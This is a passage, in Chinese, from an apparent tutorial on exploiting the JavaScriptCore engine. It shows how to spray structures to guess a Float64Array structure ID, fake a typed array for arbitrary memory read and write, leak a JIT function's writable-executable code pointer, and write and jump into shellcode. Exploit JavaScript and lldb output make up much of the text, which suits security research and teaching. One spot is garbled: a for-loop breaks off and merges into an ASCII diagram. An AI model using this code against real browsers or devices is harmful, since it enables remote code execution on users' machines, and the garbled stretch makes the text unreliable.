显然，最重要的部分是JSCell头中的结构ID，相关的结构实例使我们的存储器“看起来像”一个Float64Array的引擎。
因此，我们需要知道结构表中的Float64Array结构的ID。
#### 6.1 猜想结构字符
不幸的是，结构ID在需要时运行才会被分配，结构ID在不同的运行中不一定是静态的。此外，在引擎启动期间创建的结构ID是与版本相关的。因此，我们不知道Float64Array实例的结构ID，需要用某种方式去确定它。
不能使用任意结构ID，这也是一个稍微复杂的事情。这是因为其他圾收集单元的分配结构不是 _JavaScript对象_
（Javascript对象包括字符串，符号，正则表达式对象，甚至结构本身）。通过方法表(method table)调用
任何引用方法都将由于断言失败而导致崩溃。这些结构只有在引擎启动时候才会被分配，导致所有结构都具有相当低的ID。
为了解决这个问题，我们将使用一个简单的喷射方法：我们将通过喷射方法产生几千个结构体来表现Float64Array实例，然后选择一个高的初始ID，看看是否碰撞出一个正确的。
    for (var i = 0; i |  Uint8Array    |
    |                |   |              |                |
    |  JSCell        |   |              |  JSCell        |
    |  butterfly     |   |              |  butterfly     |
    |  vector  ------+---+              |  vector        |
    |  length        |                  |  length        |
    |  mode          |                  |  mode          |
    +----------------+                  +----------------+
这样，我们就可以将第二个数组的数据指针设置为任意地址，为我们提供任意的内存读写。
下面是使用我们以前的exploit原语创建一个假的Float64Array实例的代码。然后用附加的攻击代码创建一个全局的“内存”对象，提供方便的方法来读取和写入任意内存区域。
    sprayFloat64ArrayStructures();
    // 创建要使用的数组
    // 读写目标内存地址
    var hax = new Uint8Array(0x1000);
    var jsCellHeader = new Int64([
        00, 0x10, 00, 00,       // m_structureID, current guess
        0x0,                    // m_indexingType
        0x27,                   // m_type, Float64Array
        0x18,                   // m_flags, OverridesGetOwnPropertySlot |
            // InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
        0x1                     // m_cellState, NewWhite
    ]);
    var container = {
        jsCellHeader: jsCellHeader.encodeAsJSVal(),
        butterfly: false,       // Some arbitrary value
        vector: hax,
        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
    };
    // Create the fake Float64Array.
    var address = Add(addrof(container), 16);
    var fakearray = fakeobj(address);
    // Find the correct structure ID.
    while (!(fakearray instanceof Float64Array)) {
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        container.jsCellHeader = jsCellHeader.encodeAsJSVal();
    }
    // 完成伪造，伪造的数组现在指向hax数组 
为了更好查看结果，这里使用了lldb调试输出。 容器对象位于0x11321e1a0：
    (lldb) x/6gx 0x11321e1a0
    0x11321e1a0: 0x0100150000001138 0x0000000000000000
    0x11321e1b0: 0x0118270000001000 0x0000000000000006
    0x11321e1c0: 0x0000000113217360 0x0001000000000010
    (lldb) p *(JSC::JSArrayBufferView*)(0x11321e1a0 + 0x10)
    (JSC::JSArrayBufferView) $0 = {
      JSC::JSNonFinalObject = {
        JSC::JSObject = {
          JSC::JSCell = {
            m_structureID = 4096
            m_indexingType = '\0'
            m_type = Float64ArrayType
            m_flags = '\x18'
            m_cellState = NewWhite
          }
          m_butterfly = {
            JSC::CopyBarrierBase = (m_value = 0x0000000000000006)
          }
        }
      }
      m_vector = {
        JSC::CopyBarrierBase = (m_value = 0x0000000113217360)
      }
      m_length = 16
      m_mode = 65536
    }
注意`m_butterfly`和`m_mode`是无效的，因为我们不能写null。 到这，暂时没有问题了，但一旦垃圾收集器运行发生时就会有问题。
这我们将在稍后进行处理。
#### 6.3 执行shellcode
JavaScript引擎的一个特点就是所有的人都使用JIT编译。这个编译需要将指令写入存储器中的页面，并稍后执行它们。
为此，大多数引擎（包括JSC）分配可写和可执行的内存区域。这成为我们利用的一个好方向。
我们将使用我们的内存读写原语将一个指针泄漏到具有JavaScript函数的JIT编译代码中，然后将我们的shellcode写入并调用该函数，从而触发我们的代码执行。
附加的PoC实现了这一点。下面是runShellcode函数的相关部分：
    // This simply creates a function and calls it multiple times to
    // trigger JIT compilation.
    var func = makeJITCompiledFunction();
    var funcAddr = addrof(func);
    print("[+] Shellcode function object @ " + funcAddr);
    var executableAddr = memory.readInt64(Add(funcAddr, 24));
    print("[+] Executable instance @ " + executableAddr);
    var jitCodeAddr = memory.readInt64(Add(executableAddr, 16));
    print("[+] JITCode instance @ " + jitCodeAddr);
    var codeAddr = memory.readInt64(Add(jitCodeAddr, 32));
    print("[+] RWX memory @ " + codeAddr.toString());
    print("[+] Writing shellcode...");
    memory.write(codeAddr, shellcode);
    print("[!] Jumping into shellcode...");
    func();
可以看出，PoC代码通过从JavaScript函数对象开始的，通过从一组对象的固定偏移读取一对指针来执行指针泄漏。
这不是很好,偏移可以在版本之间改变，但是足以用于演示。首先改进的是，应该尝试使用一些简单的试探（最高位全为零，“接近”其他已知存储器区域...）来检测有效指针。
接下来，可以基于唯一的存储器模式来检测一些对象。例如，从JSCell继承的所有类（例如ExecutableBase）要以可识别的头开始。
此外，JIT编译的代码本身可能会以一个已知的函数序言开始。
请注意，从iOS10开始，JSC不再分配一个RWX区域，而是使用两个虚拟映射到同一物理内存区域，其中一个可执行，另一个可写。然后在运行时出现memcpy的特殊版本，其可写区域的随机地址作为立即值，并被映射为
--X，防止攻击者读取地址。 为了绕过这个，现在需要一个短的ROP链来调用这个memcpy，然后才进入可执行映射。